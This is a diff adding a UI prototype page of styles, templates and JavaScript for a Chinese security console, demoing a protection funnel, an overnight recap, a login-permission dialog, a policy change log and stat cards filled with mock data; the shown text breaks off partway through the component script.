+.pr-pr i{margin-left:auto;font-style:normal;font-size:12px;color:rgba(0,0,0,.45)}
+.pr-ft{display:flex;align-items:center;gap:8px;margin-top:14px;padding:12px 16px;border-top:.5px solid rgba(0,0,0,.08)}
+.pr-ft .afx-seg{margin-right:auto}
+.pr-ln{display:grid;grid-template-columns:20px minmax(0,1fr) auto;align-items:center;gap:8px;position:relative;overflow:hidden;padding:10px 14px;border-radius:2px;background:#fff;box-shadow:0 0 0 .5px rgba(0,0,0,.1);font-size:13px;animation:afxRise .3s both}
+.pr-mk{display:grid;place-items:center;width:18px;height:18px;border-radius:50%;background:#00a43319;color:#007d2ee0;font-size:11px;animation:awPop .3s cubic-bezier(.3,1.6,.5,1) both}
+.pr-mk.no{background:#f52b0018;color:#d72400da}
+.pr-ln small{margin-left:6px;font-size:12px;color:rgba(0,0,0,.45);font-variant-numeric:tabular-nums}
+.pr-drain{position:absolute;left:0;bottom:0;height:2px;background:#00b42a;transition:width 1s linear}
+.pr-note{font-size:12px;line-height:18px;color:rgba(0,0,0,.45)}
+
+/* 4 变更记录 */
+.ct{border-radius:2px;box-shadow:0 0 0 .5px rgba(0,0,0,.1)}
+.ct-h{display:flex;align-items:center;gap:8px;padding:10px 14px;border-bottom:.5px solid rgba(0,0,0,.08)}
+.ct-h b{font-size:13px;font-weight:600}
+.ct-h span{font-size:12px;color:rgba(0,0,0,.45)}
+.ct-list{position:relative;padding:6px 0}
+.ct-i{position:relative}
+.ct-i::before{content:"";position:absolute;left:23px;top:0;bottom:0;width:1.5px;background:#165dff;opacity:.35}
+.ct-i:first-child::before{top:18px}
+.ct-i:last-child::before{bottom:auto;height:18px;background:linear-gradient(#165dff,transparent)}
+.ct-r{position:relative;display:grid;grid-template-columns:20px minmax(0,1fr) auto auto;align-items:center;gap:10px;width:100%;min-height:36px;padding:0 14px;border:0;background:none;font:inherit;text-align:left;cursor:pointer}
+.ct-r:hover{background:rgba(0,0,0,.02)}
+.ct-mk{position:relative;z-index:1;display:grid;place-items:center;width:18px;height:18px;border-radius:50%;background:#e8f0ff;color:#165dff;font-size:10px;box-shadow:0 0 0 3px #fff}
+.ct-mk svg path{stroke-dasharray:20;stroke-dashoffset:0}
+.ct-i.nw .ct-mk svg path{animation:ctDraw .5s .1s ease-out both}
+.ct-i.pd .ct-mk{background:#fff;box-shadow:0 0 0 3px #fff,inset 0 0 0 1.5px rgba(22,93,255,.25)}
+.ct-i.pd .ct-mk::after{content:"";position:absolute;inset:-1px;border-radius:50%;border:1.5px solid transparent;border-top-color:#165dff;animation:ctSpin .8s linear infinite}
+.ct-i.dim .ct-msg{color:rgba(0,0,0,.45)}
+.ct-msg{overflow:hidden;font-size:13px;color:rgba(0,0,0,.88);white-space:nowrap;text-overflow:ellipsis}
+.ct-msg code{padding:0 4px;border-radius:2px;background:rgba(0,0,0,.05);font-family:ui-monospace,Menlo,monospace;font-size:11.5px}
+.ct-k{display:inline-flex;align-items:center;height:20px;padding:0 6px;border-radius:2px;font-size:11.5px;font-weight:500;white-space:nowrap}
+.ct-k.k1{background:#7c3aed14;color:#6d28d9}.ct-k.k2{background:#00a43319;color:#007d2ee0}.ct-k.k3{background:#ff9c0029;color:#b25e00}.ct-k.k4{background:#165dff14;color:#165dff}.ct-k.k5{background:rgba(0,0,0,.05);color:rgba(0,0,0,.55)}.ct-k.k6{background:#eb2f9614;color:#c41d7f}
+.ct-tm{min-width:56px;text-align:right;font-size:12px;color:rgba(0,0,0,.45);white-space:nowrap}
+.ct-tm.sh{background:linear-gradient(90deg,rgba(0,0,0,.35) 0,#165dff 50%,rgba(0,0,0,.35) 100%);background-size:200% 100%;-webkit-background-clip:text;background-clip:text;color:transparent;animation:ctSh 1.4s linear infinite}
+.ct-b{display:grid;gap:8px;padding:2px 14px 12px 44px;animation:afxRise .25s both}
+.ct-who{font-size:12px;color:rgba(0,0,0,.55)}
+.ct-who b{font-weight:500;color:rgba(0,0,0,.88)}
+.ct-tb{width:100%;border-collapse:collapse;font-size:12px}
+.ct-tb th{padding:5px 8px;background:#f7f8fa;font-weight:400;text-align:left;color:rgba(0,0,0,.45)}
+.ct-tb td{padding:6px 8px;border-top:.5px solid rgba(0,0,0,.06);color:rgba(0,0,0,.88)}
+.ct-tb td.o{color:rgba(0,0,0,.45);text-decoration:line-through}
+.ct-tb td.n{color:#007d2ee0}
+.ct-cf{display:grid;gap:8px;padding:10px 12px;border-radius:2px;background:#fff7e8;box-shadow:inset 0 0 0 .5px #ffcf8b}
+.ct-cf p{margin:0;font-size:12.5px;line-height:20px;color:rgba(0,0,0,.75)}
+.ct-cf ul{margin:0;padding:0 0 0 16px;font-size:12px;line-height:20px;color:rgba(0,0,0,.61)}
+.ct-acts{display:flex;gap:8px}
+@keyframes ctDraw{from{stroke-dashoffset:20}to{stroke-dashoffset:0}}
+@keyframes ctSpin{to{transform:rotate(360deg)}}
+@keyframes ctSh{from{background-position:200% 0}to{background-position:-200% 0}}
+
+/* 5 基础组件 */
+.sc-g{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:12px}
+.afx-sc{display:grid;gap:4px;padding:14px 16px 10px;border-radius:2px;background:#fff;box-shadow:0 0 0 .5px rgba(0,0,0,.1);text-decoration:none;color:inherit;transition:box-shadow .15s}
+.afx-sc:hover{box-shadow:0 0 0 1px rgba(22,93,255,.4)}
+.afx-sc-l{font-size:12.5px;color:rgba(0,0,0,.55)}
+.afx-sc-v{display:flex;align-items:baseline;gap:8px}
+.afx-sc-v b{font-size:26px;font-weight:600;line-height:34px;font-variant-numeric:tabular-nums}
+.afx-dl{display:inline-flex;align-items:center;gap:2px;height:20px;padding:0 6px;border-radius:2px;font-size:12px;font-weight:500;font-variant-numeric:tabular-nums}
+.afx-dl.g{background:#00a43319;color:#007d2ee0}.afx-dl.r{background:#f52b0018;color:#d72400da}
+.afx-sc-s{font-size:12px;color:rgba(0,0,0,.45)}
+.afx-sc svg{display:block;width:100%;height:36px;margin-top:4px}
+.afx-sc svg polyline{fill:none;stroke-width:1.5;vector-effect:non-scaling-stroke}
+.cs{border-radius:2px;box-shadow:0 0 0 .5px rgba(0,0,0,.1)}
+.cs-h{display:flex;align-items:center;justify-content:space-between;padding:10px 14px;border-bottom:.5px solid rgba(0,0,0,.08);font-size:13px;font-weight:600}
+.cs-h span{font-size:12px;font-weight:400;color:rgba(0,0,0,.45)}
+.cs-r{display:grid;grid-template-columns:minmax(0,1fr) 80px 96px;align-items:center;gap:8px;height:36px;padding:0 14px;font-size:13px}
+.cs-r + .cs-r{border-top:.5px solid rgba(0,0,0,.05)}
+.cs-r b{font-weight:500;text-align:right;font-variant-numeric:tabular-nums}
+.cs-d{text-align:right;font-size:12.5px;font-weight:500;font-variant-numeric:tabular-nums}
+.cs-d.g{color:#00a336}.cs-d.r{color:#f53f3f}.cs-d.z{color:rgba(0,0,0,.45)}
+.rn-top{position:relative;display:flex;align-items:center;gap:20px;height:48px;padding:0 16px;border-radius:2px;background:#fff;box-shadow:0 0 0 .5px rgba(0,0,0,.1);font-size:13px;color:rgba(0,0,0,.61)}
+.rn-top > b{margin-right:auto;font-weight:600;color:rgba(0,0,0,.88)}
+.rn-pill{display:inline-flex;align-items:center;gap:6px;height:26px;padding:0 10px;border:0;border-radius:13px;background:rgba(22,93,255,.08);font:inherit;font-size:12.5px;color:#165dff;cursor:pointer}
+.rn-pill:hover{background:rgba(22,93,255,.14)}
+.rn-pill.idle{background:rgba(0,0,0,.05);color:rgba(0,0,0,.61)}
+.rn-sp{width:10px;height:10px;border-radius:50%;border:1.5px solid rgba(22,93,255,.25);border-top-color:#165dff;animation:ctSpin .8s linear infinite}
+.rn-pill.idle .rn-sp{border-color:#00b42a;animation:none;background:#00b42a;transform:scale(.6)}
+.rn-pill em{font-style:normal;color:#b25e00}
+.rn-pop{position:absolute;right:130px;top:44px;z-index:5;width:360px;padding:6px 0;border-radius:2px;background:#fff;box-shadow:0 0 0 .5px rgba(0,0,0,.1),0 8px 24px rgba(0,0,0,.1);animation:afxRise .2s both}
+.rn-ph{display:flex;justify-content:space-between;padding:6px 14px 8px;font-size:12px;color:rgba(0,0,0,.45)}
+.rn-t{display:grid;grid-template-columns:28px minmax(0,1fr) auto;align-items:center;gap:10px;padding:8px 14px}
+.rn-t + .rn-t{border-top:.5px solid rgba(0,0,0,.05)}
+.rn-t svg{width:28px;height:28px;transform:rotate(-90deg)}
+.rn-t svg circle{fill:none;stroke-width:3}
+.rn-t svg .bg{stroke:rgba(0,0,0,.08)}
+.rn-t svg .fg{stroke:#165dff;stroke-linecap:round;transition:stroke-dasharray .6s}
+.rn-t.pz svg .fg{stroke:rgba(0,0,0,.3)}
+.rn-t.ok svg .fg{stroke:#00b42a}
+.rn-n{display:grid;gap:1px;min-width:0}
+.rn-n b{font-size:13px;font-weight:500}
+.rn-n small{overflow:hidden;font-size:12px;color:rgba(0,0,0,.45);white-space:nowrap;text-overflow:ellipsis}
+.rn-a{display:flex;gap:10px}
+.afx-g3{display:grid;grid-template-columns:minmax(0,1fr) minmax(0,1fr);gap:16px;margin-top:16px;align-items:start}
+.afx-cap{margin:0 0 8px;font-size:12px;font-weight:500;color:rgba(0,0,0,.55)}
+@media (prefers-reduced-motion:reduce){.afx *{animation:none!important;transition:none!important}.aw-ln{stroke-dashoffset:0}.aw-dot,.aw-ar{opacity:1}}
+</style>
+</helmet>
+<div class="afx">
+<h1 class="afx-h1">交互借鉴示例（第 4–7 项 + 基础组件）</h1>
+<p class="afx-sub">2026-11-26 · 参考 affectUI 的 Guardrail Funnel、Agent Recap、Permission Request、Commit Trail、Stat Card、Change Summary、Running Now，换成安全业务数据和系统样式（2px 圆角、紧凑间距）。每块都能点，看完再决定放不放进对应页面。</p>
+
+<section class="afx-sec"><div class="afx-sh"><span class="afx-no">4</span><span class="afx-st">防护漏斗</span><span class="afx-at">→ 安全总览</span><span class="afx-src">参考 Guardrail Funnel</span></div>
+<p class="afx-sd">进入主机的访问依次经过防火墙、入侵检测、病毒查杀，每层拦下的部分在带子两端用该层颜色标出，中间是继续往下走的部分（带子宽度只表示先后，准确数字看右侧）。点一层，显示它拦下的样例和命中的规则：宽度够时样例列在右侧，窄的时候放到下方。</p>
+<div class="gf2-cq"><section class="gf2" aria-label="防护漏斗"><div class="gf2-bar"><span class="gf2-tt">防护漏斗</span><span class="gf2-tot">共拦截 <b>{{gf.tot}}</b></span><span class="gf2-st"><span class="gf2-live"><i></i>实时</span><span class="gf2-rg" role="radiogroup" aria-label="时间范围"><sc-for list="{{gf.rg}}" as="r" hint-placeholder-count="3"><button type="button" class="{{r.c}}" role="radio" aria-checked="{{r.ck}}" onClick="{{r.go}}">{{r.n}}</button></sc-for></span></span></div>
+<div class="gf2-stages"><div class="gf2-list" role="listbox" aria-label="防护层"><sc-for list="{{gf.rows}}" as="s" hint-placeholder-count="5"><button type="button" class="{{s.c}}" role="option" aria-selected="{{s.sel}}" aria-label="{{s.al}}" onClick="{{s.go}}"><span class="gf2-nm"><span class="gf2-hd"><i class="{{s.ic}}" style="{{s.icc}}"></i><span class="gf2-lb">{{s.n}}</span></span><span class="gf2-mt">{{s.mt}}</span></span><span class="gf2-gap" aria-hidden="true"></span><span class="gf2-nums"><span class="gf2-cnt">{{s.cnt}}</span><span class="gf2-pct">{{s.pct}}</span></span></button></sc-for></div>
+<div class="gf2-fun" aria-hidden="true" key="{{gf.k}}"><svg viewBox="0 0 1000 200" preserveAspectRatio="none"><sc-for list="{{gf.tps}}" as="t" hint-placeholder-count="4"><path class="gf2-tp" d="{{t.d}}"></path></sc-for></svg><sc-for list="{{gf.bands}}" as="b" hint-placeholder-count="5"><div class="gf2-st2" style="{{b.st}}"><sc-if value="{{b.hasEnd}}" hint-placeholder-val="{{true}}"><span class="gf2-end"></span></sc-if><span class="{{b.cc}}" style="{{b.cw}}"></span><span class="gf2-sh" style="{{b.sd}}"></span></div></sc-for></div></div>
+<div class="gf2-pn" aria-live="polite" style="{{gf.pc}}"><div class="gf2-ph"><b>{{gf.pn}}</b><span>{{gf.ph}}</span></div><ul class="gf2-exs" style="list-style:none;margin:0;padding:0">
+<sc-for list="{{gf.ex}}" as="x" hint-placeholder-count="3"><li class="gf2-ex" key="{{x.key}}"><span class="gf2-eb"><span class="{{x.tc}}">{{x.lead}}<mark class="gf2-hit">{{x.hit}}</mark>{{x.tail}}</span><span class="gf2-em"><span class="r">{{x.rule}}</span><span class="t">{{x.at}}</span></span></span><sc-if value="{{x.can}}" hint-placeholder-val="{{true}}"><button type="button" class="gf2-act" onClick="{{x.go}}">{{x.act}}</button></sc-if><sc-if value="{{x.done}}" hint-placeholder-val="{{false}}"><span class="gf2-dn"><i>✓</i>{{x.dl}}</span></sc-if></li></sc-for>
+<sc-for list="{{gf.parts}}" as="p" hint-placeholder-count="0"><li class="gf2-pt" key="{{p.key}}"><span class="gf2-pl"><span class="l">{{p.n}}</span><span class="n">{{p.note}}</span><span class="v">{{p.v}}</span><span class="p">{{p.p}}</span></span><span class="gf2-tr"><span class="gf2-fl" style="{{p.w}}"></span></span></li></sc-for>
+</ul></div></section></div></section>
+
+<section class="afx-sec"><div class="afx-sh"><span class="afx-no">5</span><span class="afx-st">你不在时</span><span class="afx-at">→ 安全总览（隔夜或长时间未登录后首次打开时出现）</span><span class="afx-src">参考 Agent Recap</span></div>
+<p class="afx-sd">打开时曲线从左往右画出来，经过一件事就冒出一个点、点亮对应卡片，顶部计数跟着涨。下面三栏：需要你处理、失败、已完成，每张卡一个操作，做完原地变成结果和撤销。指向卡片或图上的点会互相点亮。</p>
+<section class="rcp" aria-label="你不在时"><header class="rcp-hd"><div><h2 class="rcp-tt">你不在时</h2><p class="rcp-since">自昨晚 22:00 起<span class="rcp-pill">10 小时 30 分</span></p></div><ul class="rcp-cnts" aria-label="汇总"><li><svg class="rcp-ki" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="8" cy="8" r="5.75"></circle><path d="m5.6 8.2 1.6 1.6 3.2-3.4"></path></svg><b>{{aw.cd}}</b> 已完成</li><li><svg class="rcp-ki" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="8" cy="5.25" r="2.5"></circle><path d="M3.25 13.25c.6-2.350 2.45-3.75 4.75-3.75s4.15 1.4 4.75 3.75"></path></svg><b>{{aw.cn}}</b> 需要你</li><li><svg class="rcp-ki" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M7.13 2.75a1 1 0 0 1 1.74 0l5.2 9.25a1 1 0 0 1-.87 1.5H2.8a1 1 0 0 1-.87-1.5z"></path><path d="M8 6.5v2.75M8 11.25v.01"></path></svg><b>{{aw.cf}}</b> 失败</li></ul></header><div class="rcp-ch" aria-hidden="true" onMouseMove="{{aw.mv}}" onMouseLeave="{{aw.hx}}"><svg viewBox="0 0 1000 100" preserveAspectRatio="none"><defs><linearGradient id="rcpFade" x1="0" y1="0" x2="0" y2="1"><stop offset="0" stop-color="rgba(0,0,0,.07)" stop-opacity="1"></stop><stop offset="1" stop-color="rgba(0,0,0,.07)" stop-opacity="0"></stop></linearGradient><clipPath id="rcpClip"><rect x="0" y="0" width="{{aw.cw}}" height="100"></rect></clipPath></defs><g class="rcp-grid"><line x1="0" x2="1000" y1="25" y2="25" vector-effect="non-scaling-stroke"></line><line x1="0" x2="1000" y1="50" y2="50" vector-effect="non-scaling-stroke"></line><line x1="0" x2="1000" y1="75" y2="75" vector-effect="non-scaling-stroke"></line><sc-for list="{{aw.hrs}}" as="h" hint-placeholder-count="10"><line x1="{{h.x}}" x2="{{h.x}}" y1="0" y2="100" vector-effect="non-scaling-stroke"></line></sc-for></g><g clip-path="url(#rcpClip)"><path d="{{aw.area}}" fill="url(#rcpFade)"></path><path class="rcp-line" d="{{aw.line}}" vector-effect="non-scaling-stroke"></path></g></svg><span class="rcp-frame"></span><sc-if value="{{aw.curOn}}" hint-placeholder-val="{{false}}"><span class="rcp-cur" style="{{aw.curSt}}"></span></sc-if><sc-for list="{{aw.dots}}" as="d" hint-placeholder-count="7"><span class="{{d.c}}" style="{{d.st}}" onMouseEnter="{{d.he}}"></span></sc-for><sc-if value="{{aw.tipOn}}" hint-placeholder-val="{{false}}"><span class="{{aw.tipC}}" style="{{aw.tipSt}}">{{aw.tip}}</span></sc-if></div><div class="rcp-ends" aria-hidden="true"><span>22:00</span><span>08:30</span></div><div class="rcp-board"><div class="rcp-lane"><h3 class="rcp-lh"><span class="l"><svg class="rcp-ki" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="8" cy="5.25" r="2.5"></circle><path d="M3.25 13.25c.6-2.350 2.45-3.75 4.75-3.75s4.15 1.4 4.75 3.75"></path></svg>需要你处理</span><span class="rcp-ln">{{aw.L.n.left}}</span></h3><ul class="rcp-cards"><sc-for list="{{aw.L.n.items}}" as="e" hint-placeholder-count="2"><li class="{{e.c}}" onMouseEnter="{{e.he}}" onMouseLeave="{{aw.hx}}"><span class="rcp-ct"><span class="rcp-mk" aria-hidden="true">{{e.mk}}</span><span class="rcp-ctt">{{e.t}}</span></span><span class="rcp-cm"><span class="rcp-dt">{{e.d}}</span><sc-if value="{{e.hasN}}" hint-placeholder-val="{{false}}"><span class="rcp-tag">{{e.cnt}}</span></sc-if><time class="rcp-tm">{{e.at}}</time></span><span class="rcp-ft"><span class="rcp-stx"><sc-if value="{{e.showSt}}" hint-placeholder-val="{{false}}"><span class="{{e.stc}}">{{e.st}}</span></sc-if></span><sc-if value="{{e.showRv}}" hint-placeholder-val="{{true}}"><button type="button" class="rcp-btn" onClick="{{aw.nop}}">查看</button></sc-if><button type="button" class="{{e.bc}}" aria-label="{{e.al}}" onClick="{{e.go}}">{{e.bt}}</button></span></li></sc-for></ul></div><div class="rcp-lane"><h3 class="rcp-lh"><span class="l"><svg class="rcp-ki" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M7.13 2.75a1 1 0 0 1 1.74 0l5.2 9.25a1 1 0 0 1-.87 1.5H2.8a1 1 0 0 1-.87-1.5z"></path><path d="M8 6.5v2.75M8 11.25v.01"></path></svg>失败</span><span class="rcp-ln">{{aw.L.f.left}}</span></h3><ul class="rcp-cards"><sc-for list="{{aw.L.f.items}}" as="e" hint-placeholder-count="2"><li class="{{e.c}}" onMouseEnter="{{e.he}}" onMouseLeave="{{aw.hx}}"><span class="rcp-ct"><span class="rcp-mk" aria-hidden="true">{{e.mk}}</span><span class="rcp-ctt">{{e.t}}</span></span><span class="rcp-cm"><span class="rcp-dt">{{e.d}}</span><sc-if value="{{e.hasN}}" hint-placeholder-val="{{false}}"><span class="rcp-tag">{{e.cnt}}</span></sc-if><time class="rcp-tm">{{e.at}}</time></span><span class="rcp-ft"><span class="rcp-stx"><sc-if value="{{e.showSt}}" hint-placeholder-val="{{false}}"><span class="{{e.stc}}">{{e.st}}</span></sc-if></span><sc-if value="{{e.showRv}}" hint-placeholder-val="{{true}}"><button type="button" class="rcp-btn" onClick="{{aw.nop}}">查看</button></sc-if><button type="button" class="{{e.bc}}" aria-label="{{e.al}}" onClick="{{e.go}}">{{e.bt}}</button></span></li></sc-for></ul></div><div class="rcp-lane"><h3 class="rcp-lh"><span class="l"><svg class="rcp-ki" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="8" cy="8" r="5.75"></circle><path d="m5.6 8.2 1.6 1.6 3.2-3.4"></path></svg>已完成</span><span class="rcp-ln">{{aw.L.d.left}}</span></h3><ul class="rcp-cards"><sc-for list="{{aw.L.d.items}}" as="e" hint-placeholder-count="2"><li class="{{e.c}}" onMouseEnter="{{e.he}}" onMouseLeave="{{aw.hx}}"><span class="rcp-ct"><span class="rcp-mk" aria-hidden="true">{{e.mk}}</span><span class="rcp-ctt">{{e.t}}</span></span><span class="rcp-cm"><span class="rcp-dt">{{e.d}}</span><sc-if value="{{e.hasN}}" hint-placeholder-val="{{false}}"><span class="rcp-tag">{{e.cnt}}</span></sc-if><time class="rcp-tm">{{e.at}}</time></span><span class="rcp-ft"><span class="rcp-stx"><sc-if value="{{e.showSt}}" hint-placeholder-val="{{false}}"><span class="{{e.stc}}">{{e.st}}</span></sc-if></span><sc-if value="{{e.showRv}}" hint-placeholder-val="{{true}}"><button type="button" class="rcp-btn" onClick="{{aw.nop}}">查看</button></sc-if><button type="button" class="{{e.bc}}" aria-label="{{e.al}}" onClick="{{e.go}}">{{e.bt}}</button></span></li></sc-for></ul></div></div></section>
+</section>
+
+<div class="afx-row2">
+<section class="afx-sec"><div class="afx-sh"><span class="afx-no">6</span><span class="afx-st">临时放行</span><span class="afx-at">→ 远程安全 · 登录防护</span><span class="afx-src">参考 Permission Request</span></div>
+<p class="afx-sd">运维要从新 IP 登录时，管理员在这里看清是谁、从哪、登哪台，再选允许一次、1 小时或一直允许。允许后收成一行，显示剩余时间和撤销。</p>
+<div class="pr-w">
+<sc-if value="{{pr.ask}}" hint-placeholder-val="{{true}}"><div class="pr-c" role="dialog" aria-label="{{pr.title}}"><div class="pr-top"><span class="pr-av">张</span><div class="pr-tt"><b>{{pr.title}}</b><span>登录防护 · 非常用 IP 登录被拦截 · 2 分钟前</span></div><span class="pr-tag">需要放行</span></div>
+<div class="pr-why">“在外地处理 db-01 的故障，用手机热点上网，IP 不在常用列表里。”</div>
+<div class="pr-pv"><div class="pr-pl">放行后会发生</div><sc-for list="{{pr.pv}}" as="v" hint-placeholder-count="3"><div class="pr-pr" style="{{v.dl}}"><b>{{v.n}}</b>{{v.v}}<i>{{v.m}}</i></div></sc-for></div>
+<div class="pr-ft"><div class="afx-seg" role="radiogroup" aria-label="放行多久"><sc-for list="{{pr.sc}}" as="s" hint-placeholder-count="3"><button type="button" class="{{s.c}}" role="radio" aria-checked="{{s.ck}}" onClick="{{s.go}}">{{s.n}}</button></sc-for></div><button type="button" class="afx-btn" onClick="{{pr.deny}}">拒绝</button><button type="button" class="afx-btn pr" onClick="{{pr.allow}}">{{pr.al}}</button></div></div></sc-if>
+<sc-if value="{{pr.dec}}" hint-placeholder-val="{{false}}"><div class="pr-ln" role="status"><span class="{{pr.mk}}">{{pr.mkt}}</span><span>{{pr.line}}<small>{{pr.left}}</small></span><button type="button" class="afx-lk" onClick="{{pr.undo}}">{{pr.ul}}</button><sc-if value="{{pr.timed}}" hint-placeholder-val="{{false}}"><i class="pr-drain" style="{{pr.dw}}"></i></sc-if></div></sc-if>
+<p class="pr-note">「一直允许」会把这个 IP 加进常用登录 IP；拒绝后来源 IP 按暴力破解规则继续封禁。</p>
+</div></section>
+
+<section class="afx-sec"><div class="afx-sh"><span class="afx-no">7</span><span class="afx-st">变更记录</span><span class="afx-at">→ 防护策略</span><span class="afx-src">参考 Commit Trail</span></div>
+<p class="afx-sd">每次改策略是一个节点：谁改的、改了什么、什么时候。点开看改前改后，可以回滚到某个节点；回滚本身也记成一个新节点。</p>
+<div class="ct"><div class="ct-h"><b>防护策略 · 变更记录</b><span>{{ct.cnt}} 次变更</span></div><ol class="ct-list" style="list-style:none;margin:0">
+<sc-for list="{{ct.rows}}" as="c" hint-placeholder-count="6"><li class="{{c.c}}" key="{{c.id}}"><button type="button" class="ct-r" aria-expanded="{{c.ae}}" onClick="{{c.tg}}"><span class="ct-mk"><svg width="10" height="10" viewBox="0 0 12 12" fill="none" aria-hidden="true"><path d="M2.5 6.2 5 8.6 9.6 3.6" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"></path></svg></span><span class="ct-msg">{{c.msg}}</span><span class="{{c.kc}}">{{c.kn}}</span><span class="{{c.tc}}">{{c.tm}}</span></button>
+<sc-if value="{{c.open}}" hint-placeholder-val="{{false}}"><div class="ct-b"><div class="ct-who"><b>{{c.who}}</b> · {{c.full}} · 版本 {{c.ver}}</div><table class="ct-tb"><thead><tr><th>改动项</th><th>改前</th><th>改后</th></tr></thead><tbody><sc-for list="{{c.ch}}" as="d" hint-placeholder-count="1"><tr><td>{{d.k}}</td><td class="o">{{d.a}}</td><td class="n">{{d.b}}</td></tr></sc-for></tbody></table>
+<sc-if value="{{c.canR}}" hint-placeholder-val="{{false}}"><div><button type="button" class="afx-btn sm" onClick="{{c.ask}}">回滚到这个版本</button></div></sc-if>
+<sc-if value="{{c.cf}}" hint-placeholder-val="{{false}}"><div class="ct-cf"><p>回滚到 {{c.ver}} 会撤销之后的 {{c.after}} 次修改：</p><ul><sc-for list="{{c.afl}}" as="m" hint-placeholder-count="2"><li>{{m.t}}</li></sc-for></ul><div class="ct-acts"><button type="button" class="afx-btn sm" onClick="{{c.no}}">取消</button><button type="button" class="afx-btn sm pr" onClick="{{c.yes}}">确认回滚并下发</button></div></div></sc-if>
+</div></sc-if></li></sc-for></ol></div>
+</section>
+</div>
+
+<section class="afx-sec"><div class="afx-sh"><span class="afx-no">+</span><span class="afx-st">基础组件</span><span class="afx-at">→ 安全总览指标卡、顶栏</span><span class="afx-src">参考 Stat Card · Change Summary · Running Now</span></div>
+<p class="afx-sd">指标卡：数字滚动，涨跌按「越少越好」上色（告警、漏洞下降是绿色）。变化汇总：和上周比，一行一个指标。运行中胶囊：放在顶栏，批量扫描、策略下发时出现，点开看进度、暂停或查看。</p>
+<div class="sc-g"><sc-for list="{{bs.cards}}" as="s" hint-placeholder-count="4"><a class="afx-sc" href="#" onClick="{{bs.nop}}"><span class="afx-sc-l">{{s.l}}</span><span class="afx-sc-v"><b>{{s.v}}</b><span class="{{s.dc}}">{{s.d}}</span></span><span class="afx-sc-s">{{s.s}}</span><svg viewBox="0 0 100 36" preserveAspectRatio="none" aria-hidden="true"><polyline points="{{s.pts}}" style="{{s.stk}}"></polyline></svg></a></sc-for></div>
+<div class="afx-g3"><div><p class="afx-cap">变化汇总</p><div class="cs"><div class="cs-h">较上周<span>11-19 – 11-25</span></div><sc-for list="{{bs.cs}}" as="r" hint-placeholder-count="5"><div class="cs-r"><span>{{r.n}}</span><b>{{r.v}}</b><span class="{{r.dc}}">{{r.d}}</span></div></sc-for></div></div>
+<div><p class="afx-cap">运行中胶囊（顶栏）</p><div class="rn-top"><b>德迅云控制台</b><button type="button" class="{{rn.pc}}" aria-expanded="{{rn.ae}}" onClick="{{rn.tg}}"><i class="rn-sp"></i>{{rn.pt}}</button><span>工单</span><span>文档</span><span>消息</span>
+<sc-if value="{{rn.open}}" hint-placeholder-val="{{false}}"><div class="rn-pop"><div class="rn-ph"><span>后台任务</span><span>{{rn.sum}}</span></div><sc-for list="{{rn.ts}}" as="t" hint-placeholder-count="2"><div class="{{t.c}}"><svg viewBox="0 0 28 28" aria-hidden="true"><circle class="bg" cx="14" cy="14" r="11"></circle><circle class="fg" cx="14" cy="14" r="11" style="{{t.da}}"></circle></svg><span class="rn-n"><b>{{t.n}}</b><small>{{t.step}}</small></span><span class="rn-a"><sc-if value="{{t.run}}" hint-placeholder-val="{{true}}"><button type="button" class="afx-lk" onClick="{{t.pz}}">{{t.pl}}</button></sc-if><a class="afx-lk" href="{{t.href}}">查看</a></span></div></sc-for></div></sc-if></div></div></div>
+</section>
+</div>
+</x-dc>
+<script type="text/x-dc" data-dc-script data-props='{"$preview":{"width":1440,"height":2600}}'>
+class Component extends DCLogic {
+  componentDidMount() {
+    this._t0 = Date.now();
+    const step = () => { const p = Math.min(1, (Date.now() - this._t0) / 1000); this.setState({ roll: p }); if (p < 1) this._raf = requestAnimationFrame(step); };
+    this._raf = requestAnimationFrame(step);
+    this._a0 = Date.now(); const aw = () => { const p = Math.min(1, (Date.now() - this._a0) / 1800); this.setState({ awHd: 1 - Math.pow(1 - p, 3) }); if (p < 1) this._raf2 = requestAnimationFrame(aw); }; this.setState({ awHd: 0 }); this._raf2 = requestAnimationFrame(aw); this._awTo = setTimeout(() => this.setState({ awHd: 1 }), 1950);
+    this._iv = setInterval(() => {
+      const st = this.state || {}; const rn = Object.assign({ scan: 41, push: 62, scanP: false, pushP: false }, st.rn || {});
+      if (!rn.scanP && rn.scan < 68) rn.scan += 1; if (!rn.pushP && rn.push < 68) rn.push += 1;
+      this.setState({ now: Date.now(), rn });
+    }, 1000);
+  }
+  componentWillUnmount() { clearInterval(this._iv); cancelAnimationFrame(this._raf); clearTimeout(this._ctT); }
+  renderVals() {
+    const st = this.state || {}; const set = (o) => this.setState(o);
+    const ev = (f) => (e) => { if (e && e.preventDefault) e.preventDefault(); if (e && e.stopPropagation) e.stopPropagation(); f(e); };
+    const fmt = (n) => Math.round(n).toLocaleString('en-US');
+    const ease = (t) => 1 - Math.pow(1 - t, 3); const R = ease(st.roll === undefined ? 1 : st.roll);
+    const now = st.now || Date.now();
+
+    /* 4 防护漏斗（Guardrail Funnel clean） */
+    const rgK = st.gfR || '24h'; const F = { '1h': 1 / 22, '24h': 1, '7d': 6.6 }[rgK];
+    const sc = (v) => Math.max(v ? 1 : 0, Math.round(v * F));
+    const IN = sc(1284560);
+    const SG = [
+      { id: 'in', ic: 'in', n: '进入主机的访问', h: '68 台主机的网络连接、登录、进程和文件事件', c: 'rgba(0,0,0,.35)' },
+      { id: 'fw', ic: 'fw', n: '网络防火墙', h: '端口访问控制、暴力破解封禁', b: sc(38214), verb: '拦截', c: '#165dff' },
